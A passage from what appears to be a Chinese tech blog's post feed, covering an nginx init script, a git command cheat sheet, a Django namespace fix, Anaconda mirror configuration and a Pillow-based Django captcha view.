class="line"><span class="comment"># Source function library.</span></span><br><span class="line">. /etc/rc.d/init.d/<span class="built_in">functions</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Source networking configuration.</span></span><br><span class="line">. /etc/sysconfig/network</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Check that networking is up.</span></span><br><span class="line">[ <span class="string">"<span class="variable">$NETWORKING</span>"</span> = <span class="string">"no"</span> ] &amp;&amp; <span class="built_in">exit</span> 0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nginx=<span class="string">"/usr/sbin/nginx"</span></span><br><span class="line">prog=$(basename <span class="variable">$nginx</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NGINX_CONF_FILE=<span class="string">"/etc/nginx/nginx.conf"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[ -f /etc/sysconfig/nginx ] &amp;&amp; . /etc/sysconfig/nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lockfile=/var/lock/subsys/nginx</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">make_dirs</span></span>() &#123;</span><br><span class="line">   <span class="comment"># make required directories</span></span><br><span class="line">   user=`<span class="variable">$nginx</span> -V 2&gt;&amp;1 | grep <span class="string">"configure arguments:.*--user="</span> | sed <span class="string">'s/[^*]*--user=[]∗[]∗.*/\1/g'</span> -`</span><br><span class="line">   <span class="keyword">if</span> [ -n <span class="string">"<span class="variable">$user</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">if</span> [ -z <span class="string">"`grep <span class="variable">$user</span> /etc/passwd`"</span> ]; <span class="keyword">then</span></span><br><span class="line">         useradd -M -s /bin/nologin <span class="variable">$user</span></span><br><span class="line">      <span class="keyword">fi</span></span><br><span class="line">      options=`<span class="variable">$nginx</span> -V 2&gt;&amp;1 | grep <span class="string">'configure arguments:'</span>`</span><br><span class="line">      <span class="keyword">for</span> opt <span class="keyword">in</span> <span class="variable">$options</span>; <span class="keyword">do</span></span><br><span class="line">          <span class="keyword">if</span> [ `<span class="built_in">echo</span> <span class="variable">$opt</span> | grep <span class="string">'.*-temp-path'</span>` ]; <span class="keyword">then</span></span><br><span class="line">              value=`<span class="built_in">echo</span> <span class="variable">$opt</span> | cut -d <span class="string">"="</span> -f 2`</span><br><span class="line">              <span class="keyword">if</span> [ ! -d <span class="string">"<span class="variable">$value</span>"</span> ]; <span class="keyword">then</span></span><br><span class="line">                  <span class="comment"># echo "creating" $value</span></span><br><span class="line">                  mkdir -p <span class="variable">$value</span> &amp;&amp; chown -R <span class="variable">$user</span> <span class="variable">$value</span></span><br><span class="line">              <span class="keyword">fi</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">       <span class="keyword">done</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">start</span></span>() &#123;</span><br><span class="line">    [ -x <span class="variable">$nginx</span> ] || <span class="built_in">exit</span> 5</span><br><span class="line">    [ -f <span class="variable">$NGINX_CONF_FILE</span> ] || <span class="built_in">exit</span> 6</span><br><span class="line">    make_dirs</span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Starting <span class="variable">$prog</span>: "</span></span><br><span class="line">    daemon <span class="variable">$nginx</span> -c <span class="variable">$NGINX_CONF_FILE</span></span><br><span class="line">    retval=$?</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    [ <span class="variable">$retval</span> -eq 0 ] &amp;&amp; touch <span class="variable">$lockfile</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$retval</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">stop</span></span>() &#123;</span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Stopping <span class="variable">$prog</span>: "</span></span><br><span class="line">    killproc <span class="variable">$prog</span> -QUIT</span><br><span class="line">    retval=$?</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">    [ <span class="variable">$retval</span> -eq 0 ] &amp;&amp; rm -f <span class="variable">$lockfile</span></span><br><span class="line">    <span class="built_in">return</span> <span class="variable">$retval</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">restart</span></span>() &#123;</span><br><span class="line">    configtest || <span class="built_in">return</span> $?</span><br><span class="line">    stop</span><br><span class="line">    sleep 1</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">reload</span></span>() &#123;</span><br><span class="line">    configtest || <span class="built_in">return</span> $?</span><br><span class="line">    <span class="built_in">echo</span> -n $<span class="string">"Reloading <span class="variable">$prog</span>: "</span></span><br><span class="line">    killproc <span class="variable">$nginx</span> -HUP</span><br><span class="line">    RETVAL=$?</span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">force_reload</span></span>() &#123;</span><br><span class="line">    restart</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">configtest</span></span>() &#123;</span><br><span class="line">  <span class="variable">$nginx</span> -t -c <span class="variable">$NGINX_CONF_FILE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rh_status</span></span>() &#123;</span><br><span class="line">    status <span class="variable">$prog</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">rh_status_q</span></span>() &#123;</span><br><span class="line">    rh_status &gt;/dev/null 2&gt;&amp;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">"<span class="variable">$1</span>"</span> <span class="keyword">in</span></span><br><span class="line">    start)</span><br><span class="line">        rh_status_q &amp;&amp; <span class="built_in">exit</span> 0</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 0</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    restart|configtest)</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    reload)</span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 7</span><br><span class="line">        <span class="variable">$1</span></span><br><span class="line">        ;;</span><br><span class="line">    force-reload)</span><br><span class="line">        force_reload</span><br><span class="line">        ;;</span><br><span class="line">    status)</span><br><span class="line">        rh_status</span><br><span class="line">        ;;</span><br><span class="line">    condrestart|try-restart)</span><br><span class="line">        rh_status_q || <span class="built_in">exit</span> 0</span><br><span class="line">            ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> $<span class="string">"Usage: <span class="variable">$0</span> &#123;start|stop|status|restart|condrestart|try-restart|reload|force-reload|configtest&#125;"</span></span><br><span class="line">        <span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将以上代码保存在/etc/init.d/nginx文件</span></span><br><span class="line"></span><br><span class="line">chmod +x  /etc/init.d/nginx   <span class="comment">###给/etc/init.d/nginx执行权限</span></span><br></pre></td></tr></table></figure>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/nginx_1/">nginx: [alert] kill(1668, 1) failed (3: No such process)的解决办法及nginx常用命令总结</a></li><li><a href="https://thelighter.github.io/2019/02/06/django_meta/">Django的models的meta选项和属性</a></li><li><a href="https://thelighter.github.io/2019/01/06/ubuntu_nginx/">Ubuntu的nginx安装配置</a></li><li><a href="https://thelighter.github.io/2019/01/02/django2.1_namespace/">django2.1的namespace的用法与注意事项</a></li><li><a href="https://thelighter.github.io/2018/12/19/django_verify/">Django基于pillow的登录验证码生成</a></li></ul></div>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>django</tag>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title>git最常用法大全，git必备技巧，程序员必会的git用法</title>
    <url>/2019/01/02/git_2/</url>
    <content><![CDATA[<h1 id="git特点"><a href="#git特点" class="headerlink" title="git特点"></a>git特点</h1><ul>
<li>版本控制：可以解决多人同时开发的代码问题，也可以解决找回历史代码的问题。</li>
<li>分布式：Git是分布式版本控制系统，同一个Git仓库，可以分布到不同的机器上。首先找一台电脑充当服务器的角色，每天24小时开机，其他每个人都从这个“服务器”仓库克隆一份到自己的电脑上，并且各自把各自的提交推送到服务器仓库里，也从服务器仓库中拉取别人的提交。可以自己搭建这台服务器，也可以使用GitHub网站。</li>
</ul>
<h1 id="git安装"><a href="#git安装" class="headerlink" title="git安装"></a>git安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure>
<h1 id="git命令大全"><a href="#git命令大全" class="headerlink" title="git命令大全"></a>git命令大全</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init                                                  # 初始化本地git仓库（创建新仓库）</span><br><span class="line">git config --global user.name &quot;xxx&quot;                       # 配置用户名</span><br><span class="line">git config --global user.email &quot;xxx@xxx.com&quot;              # 配置邮件</span><br><span class="line">git config --global color.ui true                         # git status等命令自动着色</span><br><span class="line">git config --global color.status auto</span><br><span class="line">git config --global color.diff auto</span><br><span class="line">git config --global color.branch auto</span><br><span class="line">git config --global color.interactive auto</span><br><span class="line">git config --global --unset http.proxy                    # remove  proxy configuration on git</span><br><span class="line">git clone git+ssh://git@192.168.53.168/VT.git             # clone远程仓库</span><br><span class="line">git status                                                # 查看当前版本状态（是否修改）</span><br><span class="line">git add xyz                                               # 添加xyz文件至index</span><br><span class="line">git add .                                                 # 增加当前子目录下所有更改过的文件至index</span><br><span class="line">git commit -m &apos;xxx&apos;                                       # 提交</span><br><span class="line">git commit --amend -m &apos;xxx&apos;                               # 合并上一次提交（用于反复修改）</span><br><span class="line">git commit -am &apos;xxx&apos;                                      # 将add和commit合为一步</span><br><span class="line">git rm xxx                                                # 删除index中的文件</span><br><span class="line">git rm -r *                                               # 递归删除</span><br><span class="line">git log                                                   # 显示提交日志</span><br><span class="line">git log -1                                                # 显示1行日志 -n为n行</span><br><span class="line">git log -5</span><br><span class="line">git log --stat                                            # 显示提交日志及相关变动文件</span><br><span class="line">git log -p -m</span><br><span class="line">git show dfb02e6e4f2f7b573337763e5c0013802e392818         # 显示某个提交的详细内容</span><br><span class="line">git show dfb02                                            # 可只用commitid的前几位</span><br><span class="line">git show HEAD                                             # 显示HEAD提交日志</span><br><span class="line">git show HEAD^                                            # 显示HEAD的父（上一个版本）的提交日志 ^^为上两个版本 ^5为上5个版本</span><br><span class="line">git tag                                                   # 显示已存在的tag</span><br><span class="line">git tag -a v2.0 -m &apos;xxx&apos;                                  # 增加v2.0的tag</span><br><span class="line">git show v2.0                                             # 显示v2.0的日志及详细内容</span><br><span class="line">git log v2.0                                              # 显示v2.0的日志</span><br><span class="line">git diff                                                  # 显示所有未添加至index的变更</span><br><span class="line">git diff --cached                                         # 显示所有已添加index但还未commit的变更</span><br><span class="line">git diff HEAD^                                            # 比较与上一个版本的差异</span><br><span class="line">git diff HEAD -- ./lib                                    # 比较与HEAD版本lib目录的差异</span><br><span class="line">git diff origin/master..master                            # 比较远程分支master上有本地分支master上没有的</span><br><span class="line">git diff origin/master..master --stat                     # 只显示差异的文件，不显示具体内容</span><br><span class="line">git remote add origin git+ssh://git@192.168.53.168/VT.git # 增加远程定义（用于push/pull/fetch）</span><br><span class="line">git branch                                                # 显示本地分支</span><br><span class="line">git branch --contains 50089                               # 显示包含提交50089的分支</span><br><span class="line">git branch -a                                             # 显示所有分支</span><br><span class="line">git branch -r                                             # 显示所有原创分支</span><br><span class="line">git branch --merged                                       # 显示所有已合并到当前分支的分支</span><br><span class="line">git branch --no-merged                                    # 显示所有未合并到当前分支的分支</span><br><span class="line">git branch -m master master_copy                          # 本地分支改名</span><br><span class="line">git checkout -b master_copy                               # 从当前分支创建新分支master_copy并检出</span><br><span class="line">git checkout -b master master_copy                        # 上面的完整版</span><br><span class="line">git checkout features/performance                         # 检出已存在的features/performance分支</span><br><span class="line">git checkout --track hotfixes/BJVEP933                    # 检出远程分支hotfixes/BJVEP933并创建本地跟踪分支</span><br><span class="line">git checkout v2.0                                         # 检出版本v2.0</span><br><span class="line">git checkout -b devel origin/develop                      # 从远程分支develop创建新本地分支devel并检出</span><br><span class="line">git checkout -- README                                    # 检出head版本的README文件（可用于修改错误回退）</span><br><span class="line">git merge origin/master                                   # 合并远程master分支至当前分支</span><br><span class="line">git cherry-pick ff44785404a8e                             # 合并提交ff44785404a8e的修改</span><br><span class="line">git push origin master                                    # 将当前分支push到远程master分支</span><br><span class="line">git push origin :hotfixes/BJVEP933                        # 删除远程仓库的hotfixes/BJVEP933分支</span><br><span class="line">git push --tags                                           # 把所有tag推送到远程仓库</span><br><span class="line">git fetch                                                 # 获取所有远程分支（不更新本地分支，另需merge）</span><br><span class="line">git fetch --prune                                         # 获取所有原创分支并清除服务器上已删掉的分支</span><br><span class="line">git pull origin master                                    # 获取远程分支master并merge到当前分支</span><br><span class="line">git mv README README2                                     # 重命名文件README为README2</span><br><span class="line">git reset --hard HEAD                                     # 将当前版本重置为HEAD（通常用于merge失败回退）</span><br><span class="line">git rebase</span><br><span class="line">git branch -d hotfixes/BJVEP933                           # 删除分支hotfixes/BJVEP933（本分支修改已合并到其他分支）</span><br><span class="line">git branch -D hotfixes/BJVEP933                           # 强制删除分支hotfixes/BJVEP933</span><br><span class="line">git ls-files                                              # 列出git index包含的文件</span><br><span class="line">git show-branch                                           # 图示当前分支历史</span><br><span class="line">git show-branch --all                                     # 图示所有分支历史</span><br><span class="line">git whatchanged                                           # 显示提交历史对应的文件修改</span><br><span class="line">git revert dfb02e6e4f2f7b573337763e5c0013802e392818       # 撤销提交dfb02e6e4f2f7b573337763e5c0013802e392818</span><br><span class="line">git ls-tree HEAD                                          # 内部命令：显示某个git对象</span><br><span class="line">git rev-parse v2.0                                        # 内部命令：显示某个ref对于的SHA1 HASH</span><br><span class="line">git reflog                                                # 显示所有提交，包括孤立节点</span><br><span class="line">git show HEAD@&#123;5&#125;</span><br><span class="line">git show master@&#123;yesterday&#125;                               # 显示master分支昨天的状态</span><br><span class="line">git log --pretty=format:&apos;%h %s&apos; --graph                   # 图示提交日志</span><br><span class="line">git show HEAD~3</span><br><span class="line">git show -s --pretty=raw 2be7fcb476</span><br><span class="line">git stash                                                 # 暂存当前修改，将所有至为HEAD状态</span><br><span class="line">git stash list                                            # 查看所有暂存</span><br><span class="line">git stash show -p stash@&#123;0&#125;                               # 参考第一次暂存</span><br><span class="line">git stash apply stash@&#123;0&#125;                                 # 应用第一次暂存</span><br><span class="line">git grep &quot;delete from&quot;                                    # 文件中搜索文本“delete from”</span><br><span class="line">git grep -e &apos;#define&apos; --and -e SORT_DIRENT</span><br><span class="line">git gc</span><br><span class="line">git fsck</span><br></pre></td></tr></table></figure>
<h1 id="git分支的处理"><a href="#git分支的处理" class="headerlink" title="git分支的处理"></a>git分支的处理</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看分支：git branch</span><br><span class="line">创建分支：git branch &lt;name&gt;</span><br><span class="line">切换分支：git checkout &lt;name&gt;</span><br><span class="line">创建+切换分支：git checkout -b &lt;name&gt;</span><br><span class="line">合并某分支到当前分支：git merge &lt;name&gt;</span><br><span class="line">删除分支：git branch -d &lt;name&gt;</span><br></pre></td></tr></table></figure>
<h2 id="git-branch分支冲突处理"><a href="#git-branch分支冲突处理" class="headerlink" title="git branch分支冲突处理"></a>git branch分支冲突处理</h2><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>master分支和dev分支各自都分别有新的提交</p>
<h3 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h3><p>打开分支文件，修改冲突的地方（git用&lt;&lt;&lt;&lt;&lt;&lt;&lt;，=======，&gt;&gt;&gt;&gt;&gt;&gt;&gt;标记出不同分支的内容）<br>再次commit即可</p>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2020/01/24/git-vscode/">如何使用vscode不必经常输入GitHub账号密码</a></li><li><a href="https://thelighter.github.io/2018/12/14/github_1/">如何更好地使用git工具，这里有最好的资料！</a></li><li><a href="https://thelighter.github.io/2018/11/20/githubraw/">Github上如何上传别人可以执行的shell代码？</a></li></ul></div>]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>git技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>django2.1的namespace的用法与注意事项</title>
    <url>/2019/01/02/django2.1_namespace/</url>
    <content><![CDATA[<h1 id="namespace报错"><a href="#namespace报错" class="headerlink" title="namespace报错"></a>namespace报错</h1><p>当我们做一个django项目时用到namespace时会遇到这样的报错，主要是我们的app_name没有设定。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">django.core.exceptions.ImproperlyConfigured: </span><br><span class="line">Specifying a namespace <span class="keyword">in</span> include() without providing an app_name <span class="keyword">is</span> <span class="keyword">not</span> supported. </span><br><span class="line">Set the app_name attribute <span class="keyword">in</span> the included module, </span><br><span class="line"><span class="keyword">or</span> <span class="keyword">pass</span> a <span class="number">2</span>-tuple containing the list of patterns <span class="keyword">and</span> app_name instead.</span><br></pre></td></tr></table></figure>
<h1 id="处理办法"><a href="#处理办法" class="headerlink" title="处理办法"></a>处理办法</h1><h2 id="正确配置namespace"><a href="#正确配置namespace" class="headerlink" title="正确配置namespace"></a>正确配置namespace</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">* urls.py中，注意与其他版本的不同之处</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> include, path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'author-polls/'</span>, include(<span class="string">'polls.urls'</span>, namespace=<span class="string">'author-polls'</span>)),</span><br><span class="line">    path(<span class="string">'publisher-polls/'</span>, include(<span class="string">'polls.urls'</span>, namespace=<span class="string">'publisher-polls'</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="app中的urls-py的配置"><a href="#app中的urls-py的配置" class="headerlink" title="app中的urls.py的配置"></a>app中的urls.py的配置</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">app_name = <span class="string">'polls'</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">''</span>, views.IndexView.as_view(), name=<span class="string">'index'</span>),</span><br><span class="line">    path(<span class="string">'&lt;int:pk&gt;/'</span>, views.DetailView.as_view(), name=<span class="string">'detail'</span>),</span><br><span class="line">    ...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h1 id="要点：注意app-name的配置，填写app的名称即可"><a href="#要点：注意app-name的配置，填写app的名称即可" class="headerlink" title="要点：注意app_name的配置，填写app的名称即可"></a>要点：注意app_name的配置，填写app的名称即可</h1><script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2019/02/06/django_meta/">Django的models的meta选项和属性</a></li><li><a href="https://thelighter.github.io/2019/01/06/nginx_init/">nginx启动关闭重启脚本制作的步骤</a></li><li><a href="https://thelighter.github.io/2018/12/19/django_verify/">Django基于pillow的登录验证码生成</a></li><li><a href="https://thelighter.github.io/2018/12/14/pycharm_django/">使用pycharm 做django开发的时候模板出现提示语句</a></li><li><a href="https://thelighter.github.io/2018/12/14/django_404/">Django2.1中对于请求的数据不存在的404处理</a></li></ul></div>]]></content>
      <categories>
        <category>django</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title>annaconda 增加删除镜像 channel, 以及其他python包安装解决办法</title>
    <url>/2018/12/22/anaconda_1/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Anaconda 是一个用于科学计算的 Python 发行版，支持 Linux, Mac, Windows, 包含了众多流行的科学计算、数据分析的 Python 包。</p>
<h1 id="下载安装源"><a href="#下载安装源" class="headerlink" title="下载安装源"></a>下载安装源</h1><p>Anaconda 安装包可以到 <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/</a> 下载。<br>TUNA 还提供了 Anaconda 仓库的镜像，运行以下命令:<br>conda config –add channels <a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</a><br>conda config –set show_channel_urls yes<br>即可添加 Anaconda Python 免费仓库。</p>
<h1 id="删除源"><a href="#删除源" class="headerlink" title="删除源"></a>删除源</h1><p>检查Anaconda的config：conda config –show ,如下图发现确实channel多了两个，显然觉得有一个是有问题的。<br>参照 conda config 说明，移除某些channel  ：<br>conda config –remove channels ‘<a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/&#39;" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/&#39;</a><br>之后再执行conda install numpy 就行了。</p>
<h1 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h1><p>不过还有简单粗暴地方法：直接修改conda的配置，一般在当前用户路径下，比如C:\Users\Administrator.condarc<br>.condarc具体内容如下：<br>show_channel_urls: true<br>channels:</p>
<ul>
<li><a href="https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/" target="_blank" rel="noopener">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/</a></li>
<li>defaults</li>
</ul>
<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<ins class="adsbygoogle" style="display:block; text-align:center;" data-ad-layout="in-article" data-ad-format="fluid" data-ad-client="ca-pub-7384725227124412" data-ad-slot="5674861023"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script><div><h1>推荐文章<span style="font-size:0.45em; color:gray"></h1><ul><li><a href="https://thelighter.github.io/2018/12/19/anaconda_source/">anaconda使用国内安装源加速（清华大学）安装软件包</a></li></ul></div>]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>anaconda</tag>
      </tags>
  </entry>
  <entry>
    <title>Django基于pillow的登录验证码生成</title>
    <url>/2018/12/19/django_verify/</url>
    <content><![CDATA[<h1 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h1><ul>
<li>此段代码用到了PIL中的Image、ImageDraw、ImageFont模块，需要先安装Pillow（3.4.1）包，详细文档参考<a href="http://pillow.readthedocs.io/en/3.4.x/" target="_blank" rel="noopener">http://pillow.readthedocs.io/en/3.4.x/</a> </li>
<li>Image表示画布对象 </li>
<li>ImageDraw表示画笔对象 </li>
<li>ImageFont表示字体对象，ubuntu的字体路径为“/usr/share/fonts/truetype/freefont”</li>
</ul>
<h1 id="具体代码"><a href="#具体代码" class="headerlink" title="具体代码"></a>具体代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PIL是python2版本的图像处理库，不过现在用Pillow比PIL强大，是python3的处理库</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="comment">#导入随机数模块</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify_code</span><span class="params">(request)</span>:</span></span><br><span class="line">        <span class="comment"># 1，定义变量，用于画面的背景色、宽、高</span></span><br><span class="line">        <span class="comment"># random.randrange(20, 100)意思是在20到100之间随机找一个数</span></span><br><span class="line">        bgcolor = (random.randrange(<span class="number">20</span>, <span class="number">100</span>), random.randrange(<span class="number">20</span>, <span class="number">100</span>), <span class="number">159</span>)</span><br><span class="line">        width = <span class="number">100</span></span><br><span class="line">        height = <span class="number">30</span></span><br><span class="line">        <span class="comment"># 2，创建画面对象</span></span><br><span class="line">        im = Image.new(<span class="string">'RGB'</span>, (width, height), bgcolor)</span><br><span class="line">        <span class="comment"># 3，创建画笔对象</span></span><br><span class="line">        draw = ImageDraw.Draw(im)</span><br><span class="line">        <span class="comment"># 4，调用画笔的point()函数绘制噪点，防止攻击</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">            <span class="comment"># 噪点绘制的范围</span></span><br><span class="line">            xy = (random.randrange(<span class="number">0</span>, width), random.randrange(<span class="number">0</span>, height))</span><br><span class="line">            <span class="comment"># 噪点的随机颜色</span></span><br><span class="line">            fill = (random.randrange(<span class="number">0</span>, <span class="number">255</span>), <span class="number">255</span>, random.randrange(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">            <span class="comment"># 绘制出噪点</span></span><br><span class="line">            draw.point(xy, fill=fill)</span><br><span class="line">        <span class="comment"># 5，定义验证码的备选值</span></span><br><span class="line">        str1 = <span class="string">'ABCD123EFGHJK456LMNPQRS789TUVWXYZ0'</span></span><br><span class="line">        <span class="comment"># 6，随机选取4个值作为验证码</span></span><br><span class="line">        rand_str = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">            rand_str += str1[random.randrange(<span class="number">0</span>, len(str1))]</span><br><span class="line">        <span class="comment"># 7，构造字体对象，ubuntu的字体路径为“/usr/share/fonts/truetype/freefont”</span></span><br><span class="line">        <span class="comment">#arial.ttf window下的字体</span></span><br><span class="line">        font = ImageFont.truetype(<span class="string">r'C:\Windows\Fonts\Arial.ttf'</span>, <span class="number">36</span>)</span><br><span class="line">        <span class="comment"># 8，构造字体颜色</span></span><br><span class="line">        fontcolor = (<span class="number">255</span>, random.randrange(<span class="number">0</span>, <span class="number">255</span>), random.randrange(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        <span class="comment"># 9，绘制4个字</span></span><br><span class="line">        draw.text((<span class="number">5</span>, <span class="number">2</span>), rand_str[<span class="number">0</span>], font=font, fill=fontcolor)</span><br><span class="line">        draw.text((<span class="number">25</span>, <span class="number">2</span>), rand_str[<span class="number">1</span>], font=font, fill=fontcolor)</span><br><span class="line">        draw.text((<span class="number">50</span>, <span class="number">2</span>), rand_str[<span class="number">2</span>], font=font, fill=fontcolor)</span><br><span class="line">        draw.text((<span class="number">75</span>, <span class="number">2</span>), rand_str[<span class="number">3</span>], font=font, fill=fontcolor)</span><br><span class="line">        <span class="comment"># 9，用完画笔，释放画笔</span></span><br><span class="line">        <span class="keyword">del</span> draw</span><br><span class="line">        <span class="comment"># 10，存入session，用于做进一步验证</span></span><br><span class="line">        request.session[<span class="string">'verifycode'</span>] = rand_str.lower()</span><br><span class="line">        <span class="comment"># 11，内存文件操作</span></span><br><span class="line">        buf = BytesIO()</span><br><span class="line">        <span class="comment"># 12，将图片保存在内存中，文件类型为png</span></span><br><span class="line">        im.save(buf, <span class="string">'png'</span>)</span><br><span class="line">        <span class="comment"># 13，将内存中的图片数据返回给客户端，MIME类型为图片png</span></span><br><span class="line">        <span class="keyword">return</span> HttpResponse(buf.getvalue(), <span class="string">'image/png'</span>)</span><br></pre></td></tr></table></figure>
